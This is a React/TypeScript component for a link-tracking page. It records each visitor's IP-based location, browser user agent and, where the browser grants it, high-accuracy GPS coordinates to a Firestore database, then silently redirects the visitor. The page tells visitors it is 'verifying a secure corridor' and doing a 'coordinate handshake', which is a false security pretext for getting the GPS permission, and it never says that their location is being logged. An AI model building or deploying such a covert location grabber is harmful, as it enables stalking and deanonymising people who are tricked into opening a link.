import React, { useEffect, useState } from 'react';
import { doc, getDoc, setDoc, updateDoc, increment, serverTimestamp } from 'firebase/firestore';
import { MapPin, Shield, CheckCircle2, ChevronRight, AlertCircle, RefreshCw } from 'lucide-react';
import { db, handleFirestoreError, OperationType } from '../lib/firebase';
import { motion } from 'motion/react';

interface VisitorTrackerProps {
  linkId: string;
}

export default function VisitorTracker({ linkId }: VisitorTrackerProps) {
  const [loading, setLoading] = useState(true);
  const [errorHeader, setErrorHeader] = useState('');
  const [errorBody, setErrorBody] = useState('');
  const [statusText, setStatusText] = useState('Resolving secure tracking link...');
  const [destination, setDestination] = useState<string | null>(null);
  const [accuracy, setAccuracy] = useState<number | null>(null);

  // Auto-generate high performance tracking and redirection logic
  useEffect(() => {
    let active = true;

    async function manageTracking() {
      try {
        // 1. Fetch Tracking Link configuration
        const linkDocRef = doc(db, 'links', linkId);
        const linkSnapshot = await getDoc(linkDocRef);

        if (!linkSnapshot.exists()) {
          setErrorHeader('Link Expired or Not Found');
          setErrorBody('The tracking link you accessed does not exist or may have been deleted by the owner.');
          setLoading(false);
          return;
        }

        const linkData = linkSnapshot.data();
        const destinationUrl = linkData.destinationUrl;
        setDestination(destinationUrl);

        // 2. Fetch IP Geolocation
        setStatusText('Analyzing communication networks...');
        let ipData: any = null;
        try {
          const response = await fetch('https://ipapi.co/json/');
          if (response.ok) {
            ipData = await response.json();
          }
        } catch (e) {
          console.error("IP lookup rate limit or blocker: ", e);
        }

        // Parse fallback details if lookup was blocked
        const fallbackIp = ipData?.ip || 'Unknown IP';
        const visitorCountry = ipData?.country_name || 'Unknown Country';
        const visitorRegion = ipData?.region || 'Unknown Region';
        const visitorCity = ipData?.city || 'Unknown City';
        const ipLat = ipData?.latitude || null;
        const ipLon = ipData?.longitude || null;

        const baseVisitorData = {
          ip: fallbackIp,
          country: visitorCountry,
          region: visitorRegion,
          city: visitorCity,
          latitude: ipLat,
          longitude: ipLon,
          accuracy: null,
          userAgent: navigator.userAgent || 'Unknown Browser',
          method: 'ip',
        };

        // 3. Ask for highly precise GPS location
        setStatusText('Requesting precise coordinate handshake...');
        
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            async (position) => {
              if (!active) return;
              
              setStatusText('Handshake approved. Logging metrics...');
              const recordId = Math.random().toString(36).substring(2, 15);
              const geoVisitPayload = {
                id: recordId,
                linkId: linkId,
                timestamp: serverTimestamp(),
                ip: baseVisitorData.ip,
                country: baseVisitorData.country,
                region: baseVisitorData.region,
                city: baseVisitorData.city,
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                userAgent: baseVisitorData.userAgent,
                method: 'gps',
              };

              await recordVisitAndRedirect(linkDocRef, linkId, recordId, geoVisitPayload, destinationUrl);
            },
            async (err) => {
              if (!active) return;
              
              console.warn("GPS tracking declined or unavailable, falling back to IP based location.", err);
              setStatusText('Handshake completed with network fallback. Redirecting...');
              const recordId = Math.random().toString(36).substring(2, 15);
              
              const ipVisitPayload = {
                id: recordId,
                linkId: linkId,
                timestamp: serverTimestamp(),
                ...baseVisitorData,
              };

              await recordVisitAndRedirect(linkDocRef, linkId, recordId, ipVisitPayload, destinationUrl);
            },
            { enableHighAccuracy: true, timeout: 5000 }
          );
        } else {
          setStatusText('Logging network metrics...');
          const recordId = Math.random().toString(36).substring(2, 15);
          const ipVisitPayload = {
            id: recordId,
            linkId: linkId,
            timestamp: serverTimestamp(),
            ...baseVisitorData,
          };

          await recordVisitAndRedirect(linkDocRef, linkId, recordId, ipVisitPayload, destinationUrl);
        }

      } catch (err) {
        if (!active) return;
        console.error("Tracking failure: ", err);
        setErrorHeader('Secure Gateway Check Failed');
        setErrorBody('An error occurred during link compilation. Please contact the administrator.');
        setLoading(false);
      }
    }

    manageTracking();

    return () => {
      active = false;
    };
  }, [linkId]);

  // Upload logs and redirect
  const recordVisitAndRedirect = async (
    linkDocRef: any,
    lId: string,
    recId: string,
    payload: any,
    targetUrl: string
  ) => {
    try {
      const visitDocRef = doc(db, 'links', lId, 'visits', recId);
      
      // Submit log to Firestore
      await setDoc(visitDocRef, payload);

      // Increment clicks counts atomically
      await updateDoc(linkDocRef, {
        clicksCount: increment(1)
      });

      // Quick visual completion state before exit redirect
      setStatusText('Connection verified! Opening secure corridor...');
      setTimeout(() => {
        // Enforce safe relative url or full qualified URL redirection
        let sanitizedUrl = targetUrl.trim();
        if (!/^https?:\/\//i.test(sanitizedUrl)) {
          sanitizedUrl = 'https://' + sanitizedUrl;
        }
        window.location.replace(sanitizedUrl);
      }, 800);

    } catch (err) {
      console.error("Failed to commit tracking metrics or increment counter: ", err);
      // Even if Firestore writes fail due to permission/quota/blocker, forward them anyway!
      let sanitizedUrl = targetUrl.trim();
      if (!/^https?:\/\//i.test(sanitizedUrl)) {
        sanitizedUrl = 'https://' + sanitizedUrl;
      }
      window.location.replace(sanitizedUrl);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50 px-4 select-none">
      <motion.div 
        initial={{ opacity: 0, y: 15 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5, ease: 'easeOut' }}
        className="w-full max-w-md bg-white rounded-2xl p-8 border border-gray-100 shadow-xl shadow-gray-200/50 text-center"
      >
        {loading ? (
          <div className="flex flex-col items-center">
            {/* Spinning Indicator */}
            <div className="relative mb-6">
              <motion.div
                animate={{ rotate: 360 }}
                transition={{ repeat: Infinity, duration: 1.5, ease: 'linear' }}
                className="w-16 h-16 border-4 border-indigo-100 border-t-indigo-600 rounded-full"
              />
              <MapPin className="w-6 h-6 text-indigo-600 absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2" />
            </div>

            <h2 className="text-xl font-semibold text-gray-900 tracking-tight mb-2">
              Verifying Secure Corridor
            </h2>
            <p className="text-sm text-gray-500 mb-6 px-4">
              Please wait while our verification gateway compiles connection certificates to redirect you safely.
            </p>

            <div className="w-full bg-gray-100 rounded-full h-1.5 overflow-hidden">
              <motion.div
                initial={{ width: "10%" }}
                animate={{ width: "95%" }}
                transition={{ duration: 3, ease: "easeInOut" }}
                className="bg-indigo-600 h-full rounded-full"
              />
            </div>
            
            <p className="text-xs font-mono text-gray-400 mt-4 uppercase tracking-wider">
              Status: {statusText}
            </p>
          </div>
        ) : (
          <div className="flex flex-col items-center">
            <div className="w-16 h-16 bg-red-50 text-red-600 rounded-full flex items-center justify-center mb-5">
              <AlertCircle className="w-8 h-8" />
            </div>

            <h2 className="text-xl font-bold text-gray-950 mb-3 tracking-tight">
              {errorHeader}
            </h2>
            <p className="text-sm text-gray-600 mb-6 leading-relaxed">
              {errorBody}
            </p>

            <p className="text-xs text-gray-400">
              Connection Portal System / a024415b
            </p>
          </div>
        )}
      </motion.div>
    </div>
  );
}
